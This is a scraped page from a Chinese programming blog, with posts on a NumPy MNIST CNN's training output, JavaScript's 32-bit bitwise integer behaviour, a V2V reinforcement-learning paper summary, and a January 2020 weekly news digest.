conv.backprop(gradient, lr)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> loss, acc</span><br><span class="line"></span><br><span class="line">print(<span class="string">'MNIST CNN initialized!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Train the CNN for 3 epochs</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">  print(<span class="string">'--- Epoch %d ---'</span> % (epoch + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Shuffle the training data</span></span><br><span class="line">  permutation = np.random.permutation(len(train_images))</span><br><span class="line">  train_images = train_images[permutation]</span><br><span class="line">  train_labels = train_labels[permutation]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Train!</span></span><br><span class="line">  loss = <span class="number">0</span></span><br><span class="line">  num_correct = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i, (im, label) <span class="keyword">in</span> enumerate(zip(train_images, train_labels)):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">100</span> == <span class="number">99</span>:</span><br><span class="line">      print(</span><br><span class="line">        <span class="string">'[Step %d] Past 100 steps: Average Loss %.3f | Accuracy: %d%%'</span> %</span><br><span class="line">        (i + <span class="number">1</span>, loss / <span class="number">100</span>, num_correct)</span><br><span class="line">      )</span><br><span class="line">      loss = <span class="number">0</span></span><br><span class="line">      num_correct = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    l, acc = train(im, label)</span><br><span class="line">    loss += l</span><br><span class="line">    num_correct += acc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test the CNN</span></span><br><span class="line">print(<span class="string">'\n--- Testing the CNN ---'</span>)</span><br><span class="line">loss = <span class="number">0</span></span><br><span class="line">num_correct = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> im, label <span class="keyword">in</span> zip(test_images, test_labels):</span><br><span class="line">  _, l, acc = forward(im, label)</span><br><span class="line">  loss += l</span><br><span class="line">  num_correct += acc</span><br><span class="line"></span><br><span class="line">num_tests = len(test_images)</span><br><span class="line">print(<span class="string">'Test Loss:'</span>, loss / num_tests)</span><br><span class="line">print(<span class="string">'Test Accuracy:'</span>, num_correct / num_tests)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">MNIST CNN initialized!</span><br><span class="line">--- Epoch 1 ---</span><br><span class="line">[Step 100] Past 100 steps: Average Loss 2.254 | Accuracy: 18%</span><br><span class="line">[Step 200] Past 100 steps: Average Loss 2.167 | Accuracy: 30%</span><br><span class="line">[Step 300] Past 100 steps: Average Loss 1.676 | Accuracy: 52%</span><br><span class="line">[Step 400] Past 100 steps: Average Loss 1.212 | Accuracy: 63%</span><br><span class="line">[Step 500] Past 100 steps: Average Loss 0.949 | Accuracy: 72%</span><br><span class="line">[Step 600] Past 100 steps: Average Loss 0.848 | Accuracy: 74%</span><br><span class="line">[Step 700] Past 100 steps: Average Loss 0.954 | Accuracy: 68%</span><br><span class="line">[Step 800] Past 100 steps: Average Loss 0.671 | Accuracy: 81%</span><br><span class="line">[Step 900] Past 100 steps: Average Loss 0.923 | Accuracy: 67%</span><br><span class="line">[Step 1000] Past 100 steps: Average Loss 0.571 | Accuracy: 83%</span><br><span class="line">--- Epoch 2 ---</span><br><span class="line">[Step 100] Past 100 steps: Average Loss 0.447 | Accuracy: 89%</span><br><span class="line">[Step 200] Past 100 steps: Average Loss 0.401 | Accuracy: 86%</span><br><span class="line">[Step 300] Past 100 steps: Average Loss 0.608 | Accuracy: 81%</span><br><span class="line">[Step 400] Past 100 steps: Average Loss 0.511 | Accuracy: 83%</span><br><span class="line">[Step 500] Past 100 steps: Average Loss 0.584 | Accuracy: 89%</span><br><span class="line">[Step 600] Past 100 steps: Average Loss 0.782 | Accuracy: 72%</span><br><span class="line">[Step 700] Past 100 steps: Average Loss 0.397 | Accuracy: 84%</span><br><span class="line">[Step 800] Past 100 steps: Average Loss 0.560 | Accuracy: 80%</span><br><span class="line">[Step 900] Past 100 steps: Average Loss 0.356 | Accuracy: 92%</span><br><span class="line">[Step 1000] Past 100 steps: Average Loss 0.576 | Accuracy: 85%</span><br><span class="line">--- Epoch 3 ---</span><br><span class="line">[Step 100] Past 100 steps: Average Loss 0.367 | Accuracy: 89%</span><br><span class="line">[Step 200] Past 100 steps: Average Loss 0.370 | Accuracy: 89%</span><br><span class="line">[Step 300] Past 100 steps: Average Loss 0.464 | Accuracy: 84%</span><br><span class="line">[Step 400] Past 100 steps: Average Loss 0.254 | Accuracy: 95%</span><br><span class="line">[Step 500] Past 100 steps: Average Loss 0.366 | Accuracy: 89%</span><br><span class="line">[Step 600] Past 100 steps: Average Loss 0.493 | Accuracy: 89%</span><br><span class="line">[Step 700] Past 100 steps: Average Loss 0.390 | Accuracy: 91%</span><br><span class="line">[Step 800] Past 100 steps: Average Loss 0.459 | Accuracy: 87%</span><br><span class="line">[Step 900] Past 100 steps: Average Loss 0.316 | Accuracy: 92%</span><br><span class="line">[Step 1000] Past 100 steps: Average Loss 0.460 | Accuracy: 87%</span><br><span class="line"></span><br><span class="line">--- Testing the CNN ---</span><br><span class="line">Test Loss: 0.5979384893783474</span><br><span class="line">Test Accuracy: 0.78</span><br></pre></td></tr></table></figure>
<p>执行输出如上。可以看到最后我们在测试集合上取得了78%的精度。</p>
<blockquote>
<p>注意到在训练集上的精度显著高于在测试集合上的精度，这说明出现了过拟合。</p>
</blockquote>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/26817/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/26817/" class="post-title-link" itemprop="url">Javascript中的整型问题</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-02-27 16:21:42 / Modified: 16:41:09" itemprop="dateCreated datePublished" datetime="2020-02-27T16:21:42+08:00">2020-02-27</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/编程研究/" itemprop="url" rel="index"><span itemprop="name">编程研究</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/26817/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/26817/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <p>这两天在写 Electron 的时候发现了一个很诡异的错误。程序前两天测试的时候没有问题，今天突然不行了。检查代码发现错误原因是这样的：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf.writeUint32BE(now &amp; <span class="number">0xffffffff</span>, idx)</span><br></pre></td></tr></table></figure>
<p>其中<code>buf</code>是一个<code>Buffer</code>对象，<code>now</code>是一个时间戳，为一个较大的整数。这行代码的目的是将时间戳的低 32 位写入 <code>buf</code>。不过，当<code>now</code>的第三十二位(自低向高)为 1 时，<code>now &amp; 0xffffffff</code>出来的会是负数，这样在<code>writeUint32BE</code>的检查中就会报错，因为这个函数不允许写入负数。</p>
<p><code>now</code>的位数显然超过了 32 比特，如果在一些类型比较强的语言里面，应该会被视为一个64位整数。那么做位运算之后应该还是一个64位整数。上面这个错误说明在Js中，一个64位整型的数字在位运算之后得到的却是一个32位有符号数。是否是<code>0xffffffff</code>限制了输出的位数呢？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; a &amp; <span class="number">0x00000000ffffffff</span></span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>0xffffffff 当做32位有符号数就是-1</p>
</blockquote>
<p>可见我们用64位的mask去做位运算得到的还是32位有符号数。</p>
<p>这种乱象的根本原因是，js实际上是使用 <a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener">IEEE-754 浮点数</a>来表示所有的数字的，包括整型也是用浮点数来表示的。另外，在js中，位运算的输出总是被当做有符号32位数字<a href="https://stackoverflow.com/questions/15517646/how-are-32-bit-javascript-numbers-resulting-from-a-bit-wise-operation-converted" target="_blank" rel="noopener">source</a>。为了摒除这两个因素的影响，我们就无法用位运算来提取低32位的内容，而应该转而使用取余运算：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; mask = <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"><span class="number">4294967296</span></span><br><span class="line">&gt; lower_32_bits = a % mask</span><br><span class="line"><span class="number">4294967295</span></span><br></pre></td></tr></table></figure>
<p>其中<code>4294967296 = 0x1000000000</code>, <code>4294967295=0xffffffff</code>。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/34309/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/34309/" class="post-title-link" itemprop="url">读论文-增强学习与车联网通信资源分配</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-02-24 12:15:59" itemprop="dateCreated datePublished" datetime="2020-02-24T12:15:59+08:00">2020-02-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-02-27 23:03:08" itemprop="dateModified" datetime="2020-02-27T23:03:08+08:00">2020-02-27</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/读论文/" itemprop="url" rel="index"><span itemprop="name">读论文</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/34309/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/34309/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <h2 id="概述">概述</h2>
<p>本次要读的论文是<a href="https://ieeexplore.ieee.org/document/8633948" target="_blank" rel="noopener">Deep Reinforcement Learning Based Resource Allocation for V2V Communications</a>，是 TVT 上的Popular Articles 中的第一篇。主要讲的内容是用增强学习（或者叫强化学习）来做 V2V 通信的资源分配。目前使用强化学习来做<strong>分布式</strong>的资源分配方案是一种比较流行的做法。使用强化学习做资源分配不要求决策者掌握全局信息。</p>
<p>对于任何一个「资源分配」机制来说，首先要明确定义待分配的资源是何种形式，以及执行分配的主体为何。在文章的 Abstract 中提到，分配的资源是：</p>
<blockquote>
<p>An autonomous &quot;agent&quot;, a V2V link or a vehicle, make its decisions to find the optimal sub-band and power-level for transmission without requiring or having to wait for global information. ... . each agent can effectively learn to satisfy the stringent latency constraints on V2V links while minimizing the interference to vehicle-to-infrastructure communications.</p>
</blockquote>
<p>从上面的论述我们可以总结如下的信息：</p>
<ol type="1">
<li>执行资源分配的主体是一条通信链路或者一个通信节点</li>
<li>待分配的资源的形式是Sub-band（可以理解为可用信道）和发射功率。发射功率直接与通信范围相关。调节通信范围是进行空分复用的一种方式</li>
<li>资源分配的目标是满足延时要求，以及最小化 V2I 通信需求</li>
<li>这里车间通信使用的是 5G D2D</li>
</ol>
<h2 id="研究背景">研究背景</h2>
<p>传统的资源分配方式一般是中心式的。这种分配方式要求从每个节点收集局部网络信息（链路状态和干扰信息）。在调度中心，资源分配问题被建模为一个优化问题，限制条件为V2V通信的QoS要求。不过这种优化问题一般是 NP 难问题。这种问题一般会用一些启发式算法来求局部最优解或者次优解。这类方法的首要问题是信息收集汇总的过程开销太大了，且随着网络规模的扩大会显著地增长。故这篇文章寻求使用分布式的分配方案。</p>
<p>现存的一些分布式的资源分配方式的问题是他们考虑的一半是单播通信(Unicast)，而非广播过程。广播通信模式中的广播风暴也是资源分配机制需要考虑的问题。传统的方法一般用随机转发或者是基于拓扑信息管理转发的方法来解决这个问题。</p>
<p>上面讨论的是中心时和分布式的资源分配方式存在的问题。下面讨论的是更加细节的问题。</p>
<p>在现有的研究中，V2V链路的QoS值包含了SINR这一个指标，延时限制这个指标不太好建模进入优化问题，因此没有被充分考虑。</p>
<p>为了解决上述这些问题，作者提出使用深度增强学习来解决单播和广播通信中的资源分配问题。作者主要用深度增强学习来研究从本地观测量，如CSI（信道状态信息），干扰水平等，和资源分配和调度方案之间的映射关系。在单播通信中，每个V2V链路被视为一个agent，频谱和传输功率为待控制的量。在广播通信中，每个节点被视为一个agent，待控制量为频谱和消息(messages)。Observation, action还有reward function都根据单播和广播做了单独的设计。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/16684/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/16684/" class="post-title-link" itemprop="url">Weekly-30</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-01-15 11:26:40" itemprop="dateCreated datePublished" datetime="2020-01-15T11:26:40+08:00">2020-01-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-02-27 19:37:00" itemprop="dateModified" datetime="2020-02-27T19:37:00+08:00">2020-02-27</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/16684/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/16684/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <h2 id="新闻">新闻</h2>
<h3 id="中美签署贸易战第一阶段协议">中美签署贸易战第一阶段协议</h3>
<p>这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸冲突曾引发全球市场焦虑，并给企业带来不确定性。</p>
<p>协议全文 94 页（<a href="http://103.78.124.74:81/2Q2W191F46ABF384979D28B01DEDE17C6AF9E671666B_unknown_4F327C5A68A8BAAC21C97C814446427060F434D5_4/images.mofcom.gov.cn/www/202001/20200116104122611.pdf" target="_blank" rel="noopener">中</a>，<a href="https://assets.bwbx.io/documents/users/iqjWHBFdfxIU/rVaHxDBUtdew/v0" target="_blank" rel="noopener">英</a>），一些重点：</p>
<ul>
<li>前 16 页详细规定了保护知识产权的力度，对窃取商业机密行为作出刑事处罚。中国将在签署后 30 工作日内公布“增强知识产权保护的行动方案，以支持其高质量增长”。</li>
<li>双方不得以市场准入相关门槛、合营并购等投资行为，强迫另外一方转让技术。</li>
<li>2020-2021 年两年间，中国将从美国增加采购 2000 亿美元商品，包括 777 亿美元制造业商品、320 亿美元农产品、524 亿美元能源产品、379 亿美元服务业产品。增加是指在 2017 年贸易战爆发前基础上增加。</li>
<li>双方互加关税没有消除。去年年底宣布达成协议时暂停增加的<a href="https://www.qdaily.com/articles/64246.html" target="_blank" rel="noopener">惩罚性关税</a>将继续暂停下去——-原定 12 月 15 日，美国对 1600 亿美元中国产手机、电脑、玩具等商品增加关税、中国对美国产汽车等商品增加关税。此外美国自 9 月 1 日起对 1200 亿中国商品加税幅度减半至 7.5%。但大部分已经执行的加税（美对中 2500 亿、中对美 1100 亿）没有取消。</li>
</ul>
<p>协议覆盖了一些已经在早先宣布的内容，比如双方遵循 G20 期间宣布的不以价格竞争为目的而贬值货币的承诺、中国对外开放银行、保险、资产管理等金融市场。</p>
<p>特朗普现场称关税问题可以在第二阶段协议里一次性解决。刘鹤现场宣读中国国家主席习近平的信，敦促美国公平对待中国公司、保护双方大学等机构的持续合作。签约仪式和双方演讲有<a href="https://www.youtube.com/watch?v=3jA4rgUHgqA" target="_blank" rel="noopener">全程直播</a>。</p>
<p>欧盟(EU)贸易专员菲尔•霍根(Phil Hogan)批评美中“第一阶段”贸易协议提供的经济利益有限，暗示这主要是唐纳德•特朗普(Donald Trump)为赢得连任而采取的政治行动 ... 此外，一些国家担心，作为协议的一部分，中国采购2000亿美元美国商品，将使世界两个最大经济体之间展开“管理贸易”，这可能会无视市场力量、对两国企业不利、违反世界贸易组织(WTO)的承诺。<a href="http://www.ftchinese.com/story/001085983" target="_blank" rel="noopener">source</a></p>
<h3 id="中国经济数据">2019 中国经济数据</h3>
<h3 id="俄罗斯政府宣布全体辞职"><a href="https://www.dw.com/zh/%E4%BF%84%E6%94%BF%E5%BA%9C%E5%AE%A3%E5%B8%83%E5%85%A8%E4%BD%93%E8%BE%9E%E8%81%8C/a-52013402" target="_blank" rel="noopener">俄罗斯政府宣布全体辞职</a></h3>
<p>据俄罗斯通讯社报道，在普京总统发表年度国情咨文后，俄罗斯总理梅德韦杰夫宣布俄政府全体辞职。梅德韦杰夫表示，在俄罗斯总统普京宣布一系列宪法修改意见后，他告知普京，俄罗斯政府决定全体辞职。梅德韦杰夫说，普京总统的建议将对国家权力的平衡带来显著变化，政府以现在的形式辞职，以便总统可以采取所有必要措施。</p>
<p>俄罗斯国际文传通讯社援引梅德韦杰夫报道，普京将提名新的政府，并指示现内阁在此之前继续留任。该通讯社还报道，普京将任命梅德韦杰夫为俄罗斯联邦安全会议副主席，负责国防和安全。</p>
<p>1月15日早些时候，普京在国情咨文讲话中宣布，将在宪法改革中赋予议会更大的权力。议会今后将决定政府首脑以及重要的内阁成员。</p>
<blockquote>
<p>李建秋在之前的一篇文章里面就提到了梅德韦杰夫的问题。梅德韦杰夫作为自由派，在很多问题上优柔寡断，损害了俄罗斯的利益，下台是必然的。</p>
</blockquote>
<p>克里姆林宫表示，俄罗斯总统普京周三正式提名名不见经传的俄罗斯联邦税务局局长Mikhail Mishustin担任新总理。<a href="https://cn.reuters.com/article/russia-putin-mishustin-new-pm-0115-idCNKBS1ZE30K?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></p>
<h3 id="美军多人在伊朗导弹袭击中受伤">美军多人在伊朗导弹袭击中受伤</h3>
<p>1 月 8 日，伊朗为报复美国无人机袭击炸死圣城旅最高领导人苏莱曼尼准将，向美军在伊拉克的若干军事基地发动了导弹袭击。随后美国总统特朗普表示伊朗的导弹袭击没有导致任何美国人的伤亡，中东局势随之降温。不过近日新的消息显示，大约有 11 名美国士兵在伊朗的导弹袭击中受伤。<a href="https://www.reuters.com/article/us-iraq-security-usa-casualties/eleven-u-s-troops-injured-in-jan-8-iran-missile-attack-in-iraq-idUSKBN1ZG0AX" target="_blank" rel="noopener">source</a></p>
<h3 id="其他">其他</h3>
<h4 id="国内">国内</h4>
<ul>
<li>武汉发现的新型冠状病毒有人传人的风险，已向全球医院发出警告。<a href="https://cn.reuters.com/article/china-health-concern-who-0114-tues-idCNKBS1ZE01J?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
<li>2019 年中国汽车的销量下降了 8.2%，至 2580 万辆。<a href="http://www.ftchinese.com/story/001085908" target="_blank" rel="noopener">source</a></li>
<li>中国海关总署发布数据，2019年，中美两国贸易额为5412.23亿美元，同比下降14.6%。<a href="http://sputniknews.cn/economics/202001141030443429/" target="_blank" rel="noopener">source</a></li>
<li>1 月 16 日，著名主持人赵忠祥去世。<a href="https://www.zhihu.com/question/366508914" target="_blank" rel="noopener">source</a></li>
<li>1 月 16 日，首家纯外资保险公司 安联中国在上海正式开业。</li>
<li>支持反送中的香港民间组织「国难中医」创建人被指在广州嫖娼被捕。这位化名”肥仔“的香港学生就读于广州中医药大学，“国难忠医”为一个志愿医务人员网。<a href="https://www.dw.com/zh/香港-国难忠医-创建人被指在广州嫖娼被捕/a-52031133?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
<li>大陆总人口突破 14 亿人。国家统计局数据显示，截至2019年末，中国大陆总人口突破14亿人，为140005万人，比上年末增长467万人。</li>
<li>国家统计局 1 月 17 日对外宣布，经过初步核算，2019 年我国国内生产总值 (GDP) 为 99.0865万亿元，稳居世界第二位；人均GDP首次站上1万美元的新台阶。此前，全球人均GDP超过1万美元的经济体总人口近15亿。中国人均GDP突破1万美元，相当于人均GDP超过1万美元的世界人口翻了一番。</li>
<li>一名女子在社交媒体上晒出了自己驾驶豪华越野车进入紫禁城的照片，在中国引发轩然大波。故宫博物院周五（1月17日）连夜致歉。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51159468" target="_blank" rel="noopener">source</a>, <a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E5%AD%90%E5%BC%80%E8%BD%A6%E8%BF%9B%E6%95%85%E5%AE%AB%E4%BA%8B%E4%BB%B6" target="_blank" rel="noopener">source: Wiki</a>,</li>
</ul>
<h4 id="国际">国际</h4>
<ul>
<li>乌克兰客机遇害者所属国家将在伦敦开会讨论对伊朗此案去法律行动。<a href="https://cn.reuters.com/article/iran-crash-ukraine-exclusive-0113-mon-idCNKBS1ZD015?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
<li>本周中美将签订贸易协议，在签订之前，美国财务部将摘掉中国汇率操纵国的标签。特朗普政府的一位官员暗示美方将采取上述行动。此举将逆转去年夏天美国政府将中国列为汇率操纵国的有争议决定；当时华盛顿和北京之间的紧张关系急剧升级。<a href="http://www.ftchinese.com/story/001085909" target="_blank" rel="noopener">source</a></li>
<li>位于拉合尔的巴基斯坦最高法院裁定审理前总统<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%A9%E5%B0%94%E9%9F%A6%E5%85%B9%C2%B7%E7%A9%86%E6%B2%99%E6%8B%89%E5%A4%AB" target="_blank" rel="noopener">穆沙拉夫</a>的特别法院违宪，后者被判处死刑。<a href="http://sputniknews.cn/politics/202001141030442655/" target="_blank" rel="noopener">source</a></li>
<li>英国首相鲍里斯·约翰逊14日明确拒绝苏格兰要求于今年举行二次独立公投的要求，称二次公投会让苏格兰再度陷入政治僵局。<a href="http://www.bjd.com.cn/a/202001/15/WS5e1e8937e4b0e6e583938c98.html" target="_blank" rel="noopener">source</a></li>
<li>在武汉发现的不明肺炎在泰国曼谷发现首例境外感染者。<a href="http://www.bbc.com/zhongwen/simp/world-51116985" target="_blank" rel="noopener">source</a></li>
<li>日本厚生劳动省对外通报，日本国内发现首例感染新型病毒的肺炎患者病例。患者是一位居住在日本、此前曾前往过武汉的中国籍男子。<a href="https://www.dw.com/zh/日本现首例新型冠状病毒肺炎/a-52020515?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
<li>丹麦地标小美人鱼像被喷上 Free Hong Kong 的口号。该雕像过往曾多次被涂鸦及损毁，更在1964年及1998年两次被“斩首”。<a href="http://www.bbc.com/zhongwen/simp/world-51116225" target="_blank" rel="noopener">source</a></li>
<li>据俄罗斯卫星网1月16日报道，车臣总统和政府网站上发布的命令称，车臣领导人拉姆赞·卡德罗夫13日签署文件任命车臣政府总理穆斯利姆·胡奇耶夫自1月13日起在他暂时丧失工作能力期间临时行使领导人职权。</li>
<li>美国要求台积电在大选前做好决定，是否前往美国生产芯片。</li>
<li>土耳其总统埃尔多安当地时间16日宣布，将开始向利比亚部署军队以支持“民族团结政府”并维护地区稳定。《卫报》援引消息人士称，土耳其已经或即将向利比亚派出2000名来自叙利亚的反政府武装分子，但这一说法未获证实。<a href="https://www.guancha.cn/internation/2020_01_17_531922.shtml" target="_blank" rel="noopener">source</a></li>
<li>土耳其解除对维基百科的屏蔽。在近一千天后，在宪法法院裁决屏蔽违法之后，土耳其解除了对维基百科的封锁。因为拒绝删除批评政府的文章，土耳其在 2017 年 4 月命令 ISP 屏蔽了维基百科。这一封锁共持续了 991 天。维基基金会对解除封锁表达了欢迎。对维基百科的解封不是一下子实现的，而是“逐步”，部分 ISP 还在处理之中。<a href="https://t.me/solidot/9931" target="_blank" rel="noopener">source: Solidot</a></li>
